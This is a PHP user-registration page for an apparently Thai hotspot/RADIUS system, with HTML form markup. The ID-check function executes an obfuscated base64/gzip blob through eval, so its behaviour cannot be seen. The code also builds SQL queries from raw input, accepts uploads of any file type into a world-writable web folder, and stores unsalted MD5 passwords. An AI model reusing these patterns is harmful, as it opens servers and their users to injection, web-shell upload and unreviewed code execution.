<?php
include("Connections/dbconnect.php");
include("include/function.php");

if($submit=="�ѹ�֡") {
	
	if($notreg=="1")
	{
  	         echo                  "<script type=text/javascript>";
		    echo                  "alert('$text22  ')";
	        echo                  "</script>";  
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  	
}
if($password=="")
	{
  	         echo                  "<script type=text/javascript>";
		    echo                  "alert('$text23 ')";
	        echo                  "</script>";  
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  	
}
if($password2  != $password)
{
  	         echo                  "<script type=text/javascript>";
		    echo                  "alert('$text24  ')";
	        echo                  "</script>";  
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  	
}
if($UserName ==""  or $password==""  or  $room ==""   or $fullname==""   or  $email=="")  {
  	         echo                  "<script type=text/javascript>";
		    echo                  "alert('��س� ��͡������  ���� ���ʡ��  �����Ţ�ѵû�ЪҪ�             ')";
	        echo                  "</script>";  
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  
			}
			

 
 if(preg_match ("/[[:punct:]]/",$UserName))  {  
 
   	         echo                  "<script type=text/javascript>";
		    echo                  "alert('   $text26  ')";
	        echo                  "</script>";  
		  echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  
}
 
function thaiIDCheck($stringID){
/*
function coded by Sarun101
return:
1, 0, -1 (positive, zero, negative)
(��ͧ��� php5 ���� php4 ���Ҩ���� + zlib + curl + pcre)
�ŷ������ 3 Ẻ
 1= positive (��ҹ��õ�Ǩ�ͺ)
 0= ��������Ѵ ���ͧ�ҡ server �ҹ��������� ���� �ա������¹�ŧ�ç���ҧ������
-1= negative (����պѵû�ЪҪ���������ԧ)
 */
$evaler=
'jZNLa9tAEMfvBn+HPYisBLLkVRNIW3QoiQKGNA6y3EtIjSqtLRE9'.
'FmmNUoI/TEzBxdfWLX1cXGPai6Hu45BbDj3E0A/RtfyIHNy6i2Bm'.
'Z3/z1zI7w0WYPjE9tfgwn3PrPFJVEuFGzTep5fBQfnqCCrunJ8XC'.
'/dMLpLQ4GYqAi2nkBo3SviBc5HOc1Yy8mqOmxg1cygtMKt3FmIaE'.
'8nNCBHtV/bB8bNSYEQF0KCUPZDlJEunMCQPqmK5khb48dTwzsBsm'.
'xYn5XA5w4gY2PichkYhD4Eb543LFEAGNmvi/0IOSdrhfEUE+B4kZ'.
'xxGuq1BiHA6s0MY8/DIYv/r0uz0ajN93++3JqH81hIIEt6A0zXBt'.
'xPC4+YwVhV9WRgRFEaAspaylkAi2s9S9tdQO+7LU9not9ksli+2s'.
'x5Q7N2PU8ngRxj4hiYrYmu2ZjO/S1br0LocdKORzG4tslB5r5Sp7'.
'kt2NqK4ZVf3I0B8dVQ40/fYROcvB1hkxG3jWZ/gcW4vspajlhTHO'.
'Rrm0i9FqR3/88frFYDzpvP15I/vTbl5K36YoqynXw/aHwdeX33vj'.
'z8x2v3Xf/erfvLm67E1Gnb9qIJVfOCrKSvMLZxZmQzfn0mmajyNi'.
'Jy3sxTgDKFmALxbS9JYsa4EN3Pqc/xfyBw==';
eval(gzinflate(base64_decode($evaler)));unset($evaler);
return $retVal;
}//End function


$a=thaiIDCheck($strID);
 
 if($none_chk_idperdb=='1')  {  $a=1;}

if($a==0) {
            echo                  "<script type=text/javascript>";
		    echo                  "alert('$text27 ')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
}
if($a==-1) {
            echo                  "<script type=text/javascript>";
		    echo                  "alert('$text28')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
}


$query_user = "select  *  from register  
                                                      where               UserName='$UserName'   
													                    
																		       
																		   or  per='$strID'                      ";

$type_db = mysql_query($query_user, $connect_db) or die(mysql_error());

$totalRows_user= mysql_num_rows($type_db);

if(    $totalRows_user > 0 ) 
{   //��Ǩ�ͺ��� �� userlogin ��������������
            echo                  "<script type=text/javascript>";
		    echo                  "alert('$text29 ')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
}  else 
{      


$query_user = "select  *  from radcheck       where               UserName='$UserName'            ";

$type_db = mysql_query($query_user, $connect_db) or die(mysql_error());

$totalRows_user= mysql_num_rows($type_db);

if(    $totalRows_user > 0 ) 
{   //��Ǩ�ͺ��� �� userlogin ��������������
            echo                  "<script type=text/javascript>";
		    echo                  "alert('$text29 ')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
} 

if($a==1     ) { //����Ţ���ѵû�ЪҪ��ը�ԧ
$register_day=date("Y-m-d H:i:s");
$password=md5($password);
mysql_query("INSERT INTO  register    (UserName,password,per,room,tel,fullname,status,email,site,register_day,idstd)
		      values('$UserName','$password','$strID','$room','$tel','$fullname','0','$email','$site','$register_day','$idstd')") or die(mysql_error());
 

 
####�Ѵ����ٻ��� upload �����
if (    $_FILES['files_name']['name'] != ""      )  

  {    
                                  $path = "pic_user" ; // ��Ǩ�ͺ�����Folder pic_user ������� �������ա����ҧ�����
				                           if(!is_dir($path)){
									        	mkdir($path,0777) ;   }
$Upload_name=$_FILES['files_name']['name'];//��Ҫ���������Ѿ��Ŵ�����㹵����  $Upload_name
$Upload_Type=$_FILES['files_name']['type']; //���=��Դ ������Ѿ��Ŵ�����㹵����  $Upload_Type
$Path_Upload_server=$_FILES['files_name']['tmp_name']; //�������� tmp �� server
$lang_name=strlen($Upload_name); //�Ҥ�����ǵ���ѡ�÷�����
$new_name = date("d-m-Y-H-i-s");  //�֧���һѨ�غѹ����ҵ����
$Fname = substr($Upload_name,0,strpos($Upload_name,"."));  //�Ѵ�������� �����੾�й��ʡ����� ���ͧ�ҡ�������¹ ���������ѹ����Ѿ��Ŵ᷹
 
$new_name = preg_replace("/$Fname/i", "$new_name", $Upload_name); // ����¹���� ��� ���ѹ���Ѩѹ���Ѩ�غѹ
$new_name2="pic_user/$new_name";
copy($Path_Upload_server,"pic_user/$new_name");
mysql_query("update   register  set   pic_user= '$new_name2' where  UserName='$UserName'  " ) or    die ("��� ������ŧ Table ����� ");
}
 
//�ѧ�Ѻ�Դ��ҹ���


if($allow_register==1) { 
############################################################
  update("register","status ='1'","where UserName ='$UserName'");  
#############
mysql_query("INSERT INTO  radcheck     (UserName,Attribute ,op ,Value)
		                                                                          values('$UserName','MD5-Password',':=','$password')") or die(mysql_error());
mysql_query("INSERT INTO  usergroup     (UserName,GroupName ,priority)
		                                                                          values('$UserName','defult','1')") or die(mysql_error());
#��˹����ء����ҹ ���������ء�͹�� user �� acctive																				  


$Attribute="Expiration";

mysql_query("INSERT INTO  radcheck  (UserName,Attribute,op,Value)
		      values('$UserName', '$Attribute',':=','$data_datessss'   )") or    die ("Add ������ŧ Table ����� ");		 																				  
################# �ѧ�Ѻ��ҹ������
$Attribute="Simultaneous-Use";

mysql_query("INSERT INTO  radcheck  (UserName,Attribute,op,Value)
		      values('$UserName', '$Attribute',':=','1'   )") or    die ("Add ������ŧ Table ����� ");		 																				  
#################
}

 	            echo                  "<script type=text/javascript>";
 		    echo                  "alert('$text30  ')";
         echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  
			}//  end  �ͧ  if($a==1) {		  
}




}

 
?>
<HTML>
<HEAD>
<TITLE>km</TITLE>
<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
<link href="main.css" rel="stylesheet" type="text/css">
<script src="selectuser.js"></script>
<style type="text/css">
<!--
.style2 {font-size: 11px; font-family: Verdana, Arial, Helvetica, sans-serif;}
.style8 {font-size: 12px; font-family: Verdana, Arial, Helvetica, sans-serif; }
.style10 {font-size: 12px}
.style11 {font-family: Verdana, Arial, Helvetica, sans-serif}
.style13 {font-size: 12px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
-->
</style>
</HEAD>


<BODY leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" >
<form action="index.php?case_i=7" method="post" enctype="multipart/form-data" name="form1" onSubmit="return chkIDCard()">
  <table width="511" height="397" border="0" cellpadding="0" cellspacing="0" background="oo.jpg">
  <tr>
    <td width="511" height="300"> 
      <table width="509" height="394" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td width="17" height="394" valign="top"><br></td>
        <td width="492" valign="top"><table width="493" height="70" border="0" align="center" cellpadding="0" cellspacing="0">
            <tr>
              <td><span class="style13">
<br>
<br>
<br>
<br>
<?php print $text31;?></span></td>
            </tr>
          </table>
              <table width="72%" height="447" border="0" align="left" cellpadding="1" cellspacing="1">
                <tr valign="baseline"> 
                  <td width="156" align="right" nowrap bgcolor="#C2E860" class="style8"><div align="left"><strong><font color="#333333"><?php print $text17;?> 
                <span class="style11">:</span></font></strong></div><br></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="UserName" type="text" class="input" id="UserName" size="25"  onKeyUp="showUser(this.value)">
                    *  <?php print $text32;?><br>
                    <div id="txtHint"> </div>
                    </font></strong></td>
                  <td bgcolor="#C2E860" class="style2"><div align="center"></div></td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><span class="style10"><font color="#333333"><?php print  $text18;?></font></span></strong></div></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="password" type="password" class="input" id="password" value="" size="25">
                    * </font></strong></td>
                  <td bgcolor="#C2E860" class="style2"><div align="center"><span class="style8"><font color="#333333"><?php print $text33;?></font></span></div></td>
                </tr>
                <tr valign="baseline">
                  <td align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><font color="#333333"><?php print $text34;?></font></strong></div> </td>
                  <td bgcolor="#E6F5BA" class="style2"><input name="password2" type="password" class="input" id="password2" value="" size="25">
                  <strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> *</font></strong></td>
                  <td bgcolor="#C2E860" class="style2">&nbsp;</td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><span class="style10">
                  <font color="#333333"><?php print $text35;?></font></span></strong></div></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="fullname" type="text" class="input" id="fullname" value="" size="25">
                    * </font></strong></td>
                  <td bgcolor="#C2E860" class="style2"><div align="center"><span class="style8"><font color="#0000CC">
                  <font color="#333333"> <?php print $text36;?></font></font></span></div></td>
                </tr>
                <tr valign="baseline"> 
                  <td height="22" align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><font color="#333333"><?php print $roomsDB; ?></font></strong></div></td>
                  <td colspan="2" bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="room" type="text" class="input" id="room" value="" size="25">
                    * </font></strong></td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style8"><div align="left"><strong><font color="#333333"><?php print $siteDB; ?></font></strong></div></td>
                  <td colspan="2" bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="site" type="text" class="input" id="site" value="" size="25">
                    * </font></strong></td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif" color="#333333"><?php echo "$idstdDB"; ?></font> 
                      </strong></div></td>
                  <td colspan="2" bgcolor="#E6F5BA" class="style2"><strong>d<font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="idstd" type="text" class="input" id="idstd" value="" size="25">
                    </font></strong></td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><span class="style10">
                  <font color="#333333"><?php print $text37;?></font></span></strong></div></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="strID" type="text" class="input" id="strID" value="" size="25" onKeyUp="showper(this.value)">
                    * </font><font color="#333333"><br>
                    ex 314100484617</font><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"><br>
                    <div id="txtHint2"> </div>
                    </font></strong></td>
                  <td bgcolor="#C2E860" class="style8"><div align="center"><font color="#333333"><?php print $text38;?> 
                      </font></div></td>
                </tr>
                <tr valign="baseline"> 
                  <td height="34" align="right" nowrap bgcolor="#C2E860" class="style2"><div align="left"><strong><span class="style10"><font color="#333333"><?php print $text39;?></font></span></strong></div></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                    <input name="tel" type="text" class="input" id="tel" value="" size="25">
                    * </font></strong></td>
                  <td bgcolor="#C2E860" class="style8"><div align="center"><font color="#0000CC"><font color="#333333"><?php print $text38;?> 
                      </font></font></div></td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style8"><div align="left"><strong><font color="#333333">E-Mail</font></strong></div></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><font color="#333333"> 
                    <input name="email" type="text" class="input" id="email" value="" size="25"  onKeyUp="showemail(this.value)">
                   
                    </font></font></strong><strong><font color="#333333" size="2" face="MS Sans Serif, Tahoma, sans-serif"> * </font></strong><br>
<div id="txtHint3"> </div></td>
                  <td bgcolor="#C2E860" class="style8"><div align="center"><font color="#333333"> Ex admin@domain.com</font></div></td>
                </tr>
                <tr valign="baseline"> </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style8"><div align="left"><strong><font color="#333333"><?php print $text40;?></font></strong></div></td>
                  <td bgcolor="#E6F5BA" class="style2"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><font color="#333333"> 
                    <input name="files_name" type="file" class="input" id="files_name" value="" size="15">
                    <br>
                    </font></font></strong></td>
                  <td bgcolor="#C2E860" class="style8"><div align="center"></div></td>
                </tr>
                <tr valign="baseline"> 
                  <td align="right" nowrap bgcolor="#C2E860" class="style8"><div align="left"><strong><font color="#333333">*<?php print $text41;?></font></strong></div></td>
                  <td width="165" bgcolor="#E6F5BA"><div align="center"> <font color="#333333"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
                      <input type="submit" value="�ѹ�֡" name="submit"    >
                      </font></strong></font></div></td>
                  <td width="132" bgcolor="#C2E860"><font color="#333333">&nbsp;</font></td>
                </tr>
            </table></td>
      </tr>
    </table></td>
  </tr>
</table>
<br>
</form>
</BODY>
</HTML>
